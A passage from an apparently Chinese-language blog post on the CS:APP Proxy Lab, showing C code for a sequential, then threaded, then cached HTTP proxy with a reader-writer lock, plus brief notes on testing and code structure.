while(1)&#123;        clientlen &#x3D;sizeof (clientaddr);        connfd &#x3D; Accept(listenfd ,(SA *)&amp;clientaddr, &amp;clientlen);        Getnameinfo((SA *)&amp;clientaddr ,clientlen,hostname ,MAXLINE,port,MAXLINE,0);        printf(&quot;Accepted connection from (%s , %s)\n&quot;, hostname ,port);&#x2F;&#x2F; accept了        &#x2F;&#x2F;Connection Succeed        handlerequest(connfd);        Close(connfd);    &#125;    return 0;&#125;void handlerequest(int fd)&#123;    int is_static;    struct stat sbuf;    char buf[MAXLINE],method[MAXLINE],uri[MAXLINE],version[MAXLINE];&#x2F;&#x2F; buf     char filename[MAXLINE];    &#x2F;&#x2F;request header    char host[MAXLINE],port[MAXLINE];    char clientRequest[MAXLINE];    &#x2F;&#x2F; IO for proxy--client ,proxy--server    rio_t rio,riotiny;    &#x2F;&#x2F; Read request line and headers    &#x2F;&#x2F; step1: read request from client    Rio_readinitb(&amp;rio,fd);    if(!Rio_readlineb(&amp;rio ,buf, MAXLINE))&#x2F;&#x2F;把输入的命令给到buf缓冲区    &#123;        printf(&quot;empty request \n&quot;);        return ;&#x2F;&#x2F; empty-&gt; close    &#125;    &#x2F;&#x2F; # HTTP&#x2F;1.1 --&gt; HTTp&#x2F;1.0    replaceHTTPVersion(buf);   parseLine(buf,host,port,method,uri,version,filename);    if(strcasecmp(method, &quot;GET&quot;))&#123;        clienterror(fd, method, &quot;501&quot;, &quot;Not Implemented&quot;,                    &quot;Tiny does not implement this method&quot;);        return ;    &#125;    &#x2F;&#x2F; parse uri from GET request     int rv&#x3D;MakeClientRequest(&amp;rio, clientRequest,host,port,method,uri,version,filename);    if(rv&#x3D;&#x3D;0)return ;    printf(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; we have formatted the reqeust into ---------\n&quot;);    printf(&quot;%s&quot;,clientRequest);    char hostName[100];    char* colon &#x3D; strstr(host, &quot;:&quot;);    strncpy(hostName, host, colon - host);    printf(&quot;host is %s\n&quot;, hostName);    printf(&quot;port is %s\n&quot;, port);    &#x2F;&#x2F;模拟一个clientfd    int clientfd &#x3D; Open_clientfd(hostName, port);    Rio_readinitb(&amp;riotiny, clientfd);    Rio_writen(riotiny.rio_fd, clientRequest, strlen(clientRequest));    &#x2F;** step4: read the response from tiny and send it to the client *&#x2F;    printf(&quot;---prepare to get the response---- \n&quot;);    char tinyResponse[MAXLINE];    int n;        while( (n &#x3D; Rio_readnb(&amp;riotiny, tinyResponse, MAXLINE)) !&#x3D; 0)&#123;        Rio_writen(fd, tinyResponse, n);    &#125;    &#125;int MakeClientRequest(rio_t* rio, char* clientRequest, char* Host, char* port,                        char* method, char* uri, char* version, char* fileName)&#123;    int UserAgent &#x3D; 0, Connection &#x3D; 0, ProxyConnection &#x3D; 0, HostInfo &#x3D; 0;    char buf[MAXLINE &#x2F; 2];    int n;    &#x2F;* 1. add GET HOSTNAME HTTP&#x2F;1.0 to header &amp;&amp; Host Info *&#x2F;    sprintf(clientRequest, &quot;GET %s HTTP&#x2F;1.0\r\n&quot;, fileName);    n &#x3D; Rio_readlineb(rio, buf, MAXLINE);&#x2F;&#x2F; n是读取的字节数    printf(&quot;receive buf %s\n&quot;, buf);    printf(&quot;n &#x3D;&#x3D; %d\n&quot;, n);    char* findp;    while(strcmp(&quot;\r\n&quot;, buf) !&#x3D; 0 &amp;&amp; n !&#x3D; 0)&#123;        strcat(clientRequest, buf);        printf(&quot;receive buf %s\n&quot;, buf);        if( (findp &#x3D; strstr(buf, &quot;User-Agent:&quot;)) !&#x3D; NULL)&#123;            UserAgent &#x3D; 1;        &#125;else if( (findp &#x3D; strstr(buf, &quot;Proxy-Connection:&quot;)) !&#x3D; NULL)&#123;            ProxyConnection &#x3D; 1;        &#125;else if( (findp &#x3D; strstr(buf, &quot;Connection:&quot;)) !&#x3D; NULL)&#123;            Connection &#x3D; 1;        &#125;else if( (findp &#x3D; strstr(buf, &quot;Host:&quot;)) !&#x3D; NULL)&#123;            HostInfo &#x3D; 1;        &#125;        n &#x3D; Rio_readlineb(rio, buf, MAXLINE);    &#125;    if(n &#x3D;&#x3D; 0)&#123;        return 0;    &#125;    if(HostInfo &#x3D;&#x3D; 0)&#123;        sprintf(buf, &quot;Host: %s\r\n&quot;, Host);        strcat(clientRequest, buf);    &#125;    &#x2F;** append User-Agent *&#x2F;    if(UserAgent &#x3D;&#x3D; 0)&#123;        strcat(clientRequest, user_agent_hdr);    &#125;        &#x2F;** append Connection *&#x2F;    if(Connection &#x3D;&#x3D; 0)&#123;        sprintf(buf, &quot;Connection: close\r\n&quot;);        strcat(clientRequest, buf);    &#125;        &#x2F;** append Proxy-Connection *&#x2F;    if(ProxyConnection &#x3D;&#x3D; 0)&#123;        sprintf(buf, &quot;Proxy-Connection: close\r\n&quot;);        strcat(clientRequest, buf);    &#125;    &#x2F;* add terminator for request *&#x2F;    strcat(clientRequest, &quot;\r\n&quot;);    return 1;&#125;void replaceHTTPVersion(char *buf)&#123;    char *pos &#x3D;NULL;    if((pos&#x3D;strstr(buf,&quot;HTTP&#x2F;1.1&quot;))!&#x3D;NULL)&#123;        buf[pos-buf+strlen(&quot;HTTP&#x2F;1.1&quot;)-1]&#x3D;&#39;0&#39;;    &#125;&#125;void parseLine(char* buf, char* host, char* port, char* method, char* uri, char* version, char* filename)&#123;    sscanf(buf, &quot;%s %s %s&quot;,method,uri,version);    &#x2F;&#x2F;method &#x3D; &quot;GET&quot;, uri &#x3D; &quot;http:&#x2F;&#x2F;localhost:15213&#x2F;home.html&quot;, version &#x3D; &quot;HTTP1.0&quot;    char* hostp &#x3D; strstr(uri, WEB_PREFIX) + strlen(WEB_PREFIX);    char* slash &#x3D; strstr(hostp, &quot;&#x2F;&quot;);    char* colon &#x3D; strstr(hostp, &quot;:&quot;);    &#x2F;&#x2F;get host name    strncpy(host, hostp, slash - hostp);      &#x2F;&#x2F;get port number    strncpy(port, colon + 1, slash - colon - 1);    &#x2F;&#x2F;get file name    strcpy(filename, slash);    &#x2F;*    host : localhost:15214    filename: &#x2F;home.html    *&#x2F;&#125;&#x2F;&#x2F; html headers and response bodyvoid clienterror(int fd,char *cause,char *errnum, char *shortmsg, char *longmsg)&#123;    char buf[MAXLINE];    &#x2F;* Print the HTTP response headers *&#x2F;    sprintf(buf, &quot;HTTP&#x2F;1.0 %s %s\r\n&quot;, errnum, shortmsg);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Content-type: text&#x2F;html\r\n\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    &#x2F;* Print the HTTP response body *&#x2F;    sprintf(buf, &quot;&lt;html&gt;&lt;title&gt;Tiny Error&lt;&#x2F;title&gt;&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;body bgcolor&#x3D;&quot;&quot;ffffff&quot;&quot;&gt;\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;%s: %s\r\n&quot;, errnum, shortmsg);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;p&gt;%s: %s\r\n&quot;, longmsg, cause);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;hr&gt;&lt;em&gt;The Tiny Web server&lt;&#x2F;em&gt;\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PART-II"><a href="#PART-II" class="headerlink" title="PART II"></a>PART II</h3><h4 id="测试大坑："><a href="#测试大坑：" class="headerlink" title="测试大坑："></a>测试大坑：</h4><p>Driver.sh的301行左右，要修正</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202408180454911.png" alt="image-20240818044744099"></p><p>要有python程序执行nop-sever.py的脚本，需要使用<code>python --version</code>命令看自己的python是什么版本</p><h4 id="代码大纲"><a href="#代码大纲" class="headerlink" title="代码大纲"></a>代码大纲</h4><p><strong>主函数 (<code>main</code>)</strong>：</p><ul><li>初始化读写锁 (<code>rwlock_init</code>)，用于控制对共享资源的访问。</li><li>监听指定端口的连接请求。</li><li>接受客户端连接，并为每个连接创建一个新的线程进行处理 (<code>thread</code> 函数)。</li></ul><p><strong>读写锁 (<code>rwlock_init</code>)</strong>：</p><ul><li>初始化了读锁和写锁，用于同步读写操作。</li></ul><p><strong>线程处理函数 (<code>thread</code>)</strong>：</p><ul><li>分离当前线程，并调用 <code>handlerequest</code> 处理客户端请求。</li></ul><p><strong>请求处理函数 (<code>handlerequest</code>)</strong>：</p><ul><li>读取客户端请求，解析请求行和头部信息。</li><li>调用 <code>MakeClientRequest</code> 构建发送到目标服务器的请求。</li><li>将目标服务器的响应返回给客户端。</li></ul><p><strong>请求构建函数 (<code>MakeClientRequest</code>)</strong>：</p><ul><li>读取客户端请求头，处理必要的字段（如 User-Agent、Connection、Proxy-Connection 和 Host）。</li><li>形成完整的请求并准备发送到目标服务器。</li></ul><p><strong>替换 HTTP 版本函数 (<code>replaceHTTPVersion</code>)</strong>：</p><ul><li>将 HTTP&#x2F;1.1 替换为 HTTP&#x2F;1.0，以兼容目标服务器。</li></ul><p><strong>解析请求行函数 (<code>parseLine</code>)</strong>：</p><ul><li>解析请求行，提取主机、端口、URI 和文件名等信息。</li></ul><p><strong>错误处理函数 (<code>Clienterror</code>)</strong>：</p><ul><li>构建并发送一个标准的 HTTP 错误响应给客户端。</li></ul><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码:"></a>完整代码:</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;csapp.h&quot;&#x2F;* Recommended max cache and object sizes *&#x2F;#define MAX_CACHE_SIZE 1049000#define MAX_OBJECT_SIZE 102400#define WEB_PREFIX &quot;http:&#x2F;&#x2F;&quot;&#x2F;* You won&#39;t lose style points for including this long line in your code *&#x2F;static const char *user_agent_hdr &#x3D; &quot;User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:10.0.3) Gecko&#x2F;20120305 Firefox&#x2F;10.0.3\r\n&quot;;void handlerequest(int);void Clienterror(int , char* , char* , char* , char* );int MakeClientRequest(rio_t* , char* , char*, char* , char* , char* , char*, char*);int checkGetMethod(char* , char* , char* );void replaceHTTPVersion(char* );void parseLine(char* , char*, char* , char* , char* , char*, char*);void *thread(void *v);void rwlock_init();struct rwlock_t&#123;    sem_t lock;    sem_t writelock;    int readers;&#125;;int nowpointer;struct Cache cache[MAXLINE];struct rwlock_t *rw;int main(int argc,char **argv)&#123;    rw&#x3D; Malloc(sizeof(struct rwlock_t));    pthread_t tid;    int listenfd,connfd;    rwlock_init();    char hostname[MAXLINE],port[MAXLINE];    socklen_t clientlen;    struct sockaddr_storage clientaddr;    &#x2F;&#x2F;判断是否是两个命令    if(argc!&#x3D;2)&#123;        fprintf(stderr,&quot;usage: Fuck ,can you input only two string ?\nsuch as%s &lt;port&gt;\n&quot;, argv[0]);       &#x2F;&#x2F; printf(&quot;Fuck ,input right message \n&quot;);        exit(1);    &#125;    listenfd &#x3D;Open_listenfd(argv[1]);   &#x2F;&#x2F;listen a port    while(1)&#123;        clientlen &#x3D;sizeof (clientaddr);        connfd &#x3D; Accept(listenfd ,(SA *)&amp;clientaddr, &amp;clientlen);        Getnameinfo((SA *)&amp;clientaddr ,clientlen,hostname ,MAXLINE,port,MAXLINE,0);        printf(&quot;Accepted connection from (%s , %s)\n&quot;, hostname ,port);&#x2F;&#x2F; accept了        &#x2F;&#x2F;Connection Succeed       Pthread_create(&amp;tid,NULL,(void*) thread,(void*)&amp;connfd);    &#125;    return 0;&#125;void rwlock_init()&#123;    rw-&gt;readers&#x3D;0;    sem_init(&amp;rw-&gt;lock,0,1);    &#x2F;*    sem_init 是一个用于初始化信号量的函数。这里初始化了 rw-&gt;lock 信号量。    0 表示信号量用于线程间同步（而非进程间同步）。    1 表示信号量的初始值为 1，即该信号量是一个二值信号量，用于互斥访问。    *&#x2F;    sem_init(&amp;rw-&gt;writelock,0,1);&#125;void *thread(void *v)&#123;    int fd&#x3D;*(int*)v;    Pthread_detach(pthread_self());    handlerequest(fd);   &#x2F;&#x2F; Free(v);    Close(fd);    return ;&#125;void handlerequest(int fd)&#123;    char buf[MAXLINE],method[MAXLINE],uri[MAXLINE],version[MAXLINE];&#x2F;&#x2F; buf     char filename[MAXLINE];    &#x2F;&#x2F;request header    char host[MAXLINE],port[MAXLINE];    char clientRequest[MAXLINE];    &#x2F;&#x2F; IO for proxy--client ,proxy--server    rio_t rio,riotiny;    &#x2F;&#x2F; Read request line and headers    &#x2F;&#x2F; step1: read request from client    Rio_readinitb(&amp;rio,fd);    if(!Rio_readlineb(&amp;rio ,buf, MAXLINE))&#x2F;&#x2F;把输入的命令给到buf缓冲区    &#123;        printf(&quot;empty request \n&quot;);        return ;&#x2F;&#x2F; empty-&gt; close    &#125;    &#x2F;&#x2F; # HTTP&#x2F;1.1 --&gt; HTTp&#x2F;1.0    replaceHTTPVersion(buf);   parseLine(buf,host,port,method,uri,version,filename);    if(strcasecmp(method, &quot;GET&quot;))&#123;        Clienterror(fd, method, &quot;501&quot;, &quot;Not Implemented&quot;,                    &quot;Tiny does not implement this method&quot;);        return ;    &#125;    &#x2F;&#x2F; parse uri from GET request     int rv&#x3D;MakeClientRequest(&amp;rio, clientRequest,host,port,method,uri,version,filename);    if(rv&#x3D;&#x3D;0)return ;    printf(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; we have formatted the reqeust into ---------\n&quot;);    printf(&quot;%s&quot;,clientRequest);    char hostName[100];    char* colon &#x3D; strstr(host, &quot;:&quot;);    strncpy(hostName, host, colon - host);    printf(&quot;host is %s\n&quot;, hostName);    printf(&quot;port is %s\n&quot;, port);    &#x2F;&#x2F;模拟一个clientfd    int clientfd &#x3D; Open_clientfd(hostName, port);    Rio_readinitb(&amp;riotiny, clientfd);    Rio_writen(riotiny.rio_fd, clientRequest, strlen(clientRequest));    &#x2F;** step4: read the response from tiny and send it to the client *&#x2F;    printf(&quot;---prepare to get the response---- \n&quot;);    char tinyResponse[MAXLINE];    int n;     while( (n &#x3D; Rio_readlineb(&amp;riotiny, tinyResponse, MAXLINE)) !&#x3D; 0)&#123;        Rio_writen(fd, tinyResponse, n);    &#125;    close(clientfd);    return ;  &#125;int MakeClientRequest(rio_t* rio, char* clientRequest, char* Host, char* port,                        char* method, char* uri, char* version, char* fileName)&#123;    int UserAgent &#x3D; 0, Connection &#x3D; 0, ProxyConnection &#x3D; 0, HostInfo &#x3D; 0;    char buf[MAXLINE &#x2F; 2];    int n;    &#x2F;* 1. add GET HOSTNAME HTTP&#x2F;1.0 to header &amp;&amp; Host Info *&#x2F;    sprintf(clientRequest, &quot;GET %s HTTP&#x2F;1.0\r\n&quot;, fileName);    n &#x3D; Rio_readlineb(rio, buf, MAXLINE);&#x2F;&#x2F; n是读取的字节数    printf(&quot;receive buf %s\n&quot;, buf);    printf(&quot;n &#x3D;&#x3D; %d\n&quot;, n);    char* findp;    while(strcmp(&quot;\r\n&quot;, buf) !&#x3D; 0 &amp;&amp; n !&#x3D; 0)&#123;        strcat(clientRequest, buf);        printf(&quot;receive buf %s\n&quot;, buf);        if( (findp &#x3D; strstr(buf, &quot;User-Agent:&quot;)) !&#x3D; NULL)&#123;            UserAgent &#x3D; 1;        &#125;else if( (findp &#x3D; strstr(buf, &quot;Proxy-Connection:&quot;)) !&#x3D; NULL)&#123;            ProxyConnection &#x3D; 1;        &#125;else if( (findp &#x3D; strstr(buf, &quot;Connection:&quot;)) !&#x3D; NULL)&#123;            Connection &#x3D; 1;        &#125;else if( (findp &#x3D; strstr(buf, &quot;Host:&quot;)) !&#x3D; NULL)&#123;            HostInfo &#x3D; 1;        &#125;        n &#x3D; Rio_readlineb(rio, buf, MAXLINE);    &#125;    if(n &#x3D;&#x3D; 0)&#123;        return 0;    &#125;    if(HostInfo &#x3D;&#x3D; 0)&#123;        sprintf(buf, &quot;Host: %s\r\n&quot;, Host);        strcat(clientRequest, buf);    &#125;    &#x2F;** append User-Agent *&#x2F;    if(UserAgent &#x3D;&#x3D; 0)&#123;        strcat(clientRequest, user_agent_hdr);    &#125;        &#x2F;** append Connection *&#x2F;    if(Connection &#x3D;&#x3D; 0)&#123;        sprintf(buf, &quot;Connection: close\r\n&quot;);        strcat(clientRequest, buf);    &#125;        &#x2F;** append Proxy-Connection *&#x2F;    if(ProxyConnection &#x3D;&#x3D; 0)&#123;        sprintf(buf, &quot;Proxy-Connection: close\r\n&quot;);        strcat(clientRequest, buf);    &#125;    &#x2F;* add terminator for request *&#x2F;    strcat(clientRequest, &quot;\r\n&quot;);    return 1;&#125;void replaceHTTPVersion(char *buf)&#123;    char *pos &#x3D;NULL;    if((pos&#x3D;strstr(buf,&quot;HTTP&#x2F;1.1&quot;))!&#x3D;NULL)&#123;        buf[pos-buf+strlen(&quot;HTTP&#x2F;1.1&quot;)-1]&#x3D;&#39;0&#39;;    &#125;&#125;void parseLine(char* buf, char* host, char* port, char* method, char* uri, char* version, char* filename)&#123;    sscanf(buf, &quot;%s %s %s&quot;,method,uri,version);    &#x2F;&#x2F;method &#x3D; &quot;GET&quot;, uri &#x3D; &quot;http:&#x2F;&#x2F;localhost:15213&#x2F;home.html&quot;, version &#x3D; &quot;HTTP1.0&quot;    char* hostp &#x3D; strstr(uri, WEB_PREFIX) + strlen(WEB_PREFIX);    char* slash &#x3D; strstr(hostp, &quot;&#x2F;&quot;);    char* colon &#x3D; strstr(hostp, &quot;:&quot;);    &#x2F;&#x2F;get host name    strncpy(host, hostp, slash - hostp);      &#x2F;&#x2F;get port number    strncpy(port, colon + 1, slash - colon - 1);    &#x2F;&#x2F;get file name    strcpy(filename, slash);    &#x2F;*    host : localhost:15214    filename: &#x2F;home.html    *&#x2F;&#125;&#x2F;&#x2F; html headers and response bodyvoid Clienterror(int fd,char *cause,char *errnum, char *shortmsg, char *longmsg)&#123;    char buf[MAXLINE];    &#x2F;* Print the HTTP response headers *&#x2F;    sprintf(buf, &quot;HTTP&#x2F;1.0 %s %s\r\n&quot;, errnum, shortmsg);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;Content-type: text&#x2F;html\r\n\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    &#x2F;* Print the HTTP response body *&#x2F;    sprintf(buf, &quot;&lt;html&gt;&lt;title&gt;Tiny Error&lt;&#x2F;title&gt;&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;body bgcolor&#x3D;&quot;&quot;ffffff&quot;&quot;&gt;\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;%s: %s\r\n&quot;, errnum, shortmsg);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;p&gt;%s: %s\r\n&quot;, longmsg, cause);    Rio_writen(fd, buf, strlen(buf));    sprintf(buf, &quot;&lt;hr&gt;&lt;em&gt;The Tiny Web server&lt;&#x2F;em&gt;\r\n&quot;);    Rio_writen(fd, buf, strlen(buf));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Part-III"><a href="#Part-III" class="headerlink" title="Part III"></a>Part III</h3><p>添加了一些cache即可</p><h4 id="代码重点："><a href="#代码重点：" class="headerlink" title="代码重点："></a>代码重点：</h4><p>读写cache其实就是给cache建立了一个数组，但是多线程读取写入的时候每次要记得上锁解锁。</p><h5 id="cache结构体"><a href="#cache结构体" class="headerlink" title="cache结构体"></a>cache结构体</h5><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct Cache&#123;    int used;    char key[MAXLINE];    char value[MAX_OBJECT_SIZE];&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="write-cache"><a href="#write-cache" class="headerlink" title="write_cache"></a>write_cache</h5><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void writecache(char * buf,char *key)&#123;    sem_wait(&amp;rw-&gt;writelock);    int index;    while(cache[nowpointer].used!&#x3D;0)&#123;        cache[nowpointer].used&#x3D;0;        nowpointer&#x3D;(nowpointer+1)%MAX_CACHE;    &#125;    index &#x3D;nowpointer;    cache[index].used&#x3D;1;    strcpy(cache[index].key,key);    strcpy(cache[index].value,buf);    sem_post(&amp;rw-&gt;writelock);    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="read-cache"><a href="#read-cache" class="headerlink" title="read_cache"></a>read_cache</h5><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int readcache(int fd,char *uri)&#123;    sem_wait(&amp;rw-&gt;lock);    if(rw-&gt;readers&#x3D;&#x3D;0)sem_wait(&amp;rw-&gt;writelock);    rw-&gt;readers++;    sem_post(&amp;rw-&gt;lock);    int i;    int flag&#x3D;0;    for(i&#x3D;0;i&lt;MAX_CACHE;i++)&#123;        if(strcmp(uri,cache[i].key)&#x3D;&#x3D;0)&#123;            Rio_writen(fd,cache[i].value,strlen(cache[i].value));        &#x2F;&#x2F;    printf(&quot;proxy send %d bytes to client\n&quot;, strlen(cache[i].value));            cache[i].used&#x3D;1;            flag&#x3D;1;            break;        &#125;    &#125;    sem_wait(&amp;rw-&gt;lock);    rw-&gt;readers--;    if(rw-&gt;readers&#x3D;&#x3D;0)    sem_post(&amp;rw-&gt;writelock);    sem_post(&amp;rw-&gt;lock);    return flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h4><pre class="line-numbers language-d" data-language="d"><code class="language-d">#include <span class="token string">"csapp.h"</span>#define MAX_CACHE <span class="token number">10</span><span class="token comment">/* Recommended max cache and object sizes */</span>#define MAX_CACHE_SIZE <span class="token number">1049000</span>#define MAX_OBJECT_SIZE <span class="token number">102400</span>#define WEB_PREFIX <span class="token string">"http://"</span><span class="token comment">/* You won't lose style points for including this long line in your code */</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>user_agent_hdr <span class="token operator">=</span> <span class="token string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">handlerequest</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Clienterror</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">MakeClientRequest</span><span class="token punctuation">(</span>rio_t<span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">checkGetMethod</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">replaceHTTPVersion</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">parseLine</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">rwlock_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">readcache</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">writecache</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> rwlock_t<span class="token punctuation">&#123;</span>    sem_t lock<span class="token punctuation">;</span>    sem_t writelock<span class="token punctuation">;</span>    <span class="token keyword">int</span> readers<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> Cache<span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> used<span class="token punctuation">;</span>    <span class="token keyword">char</span> 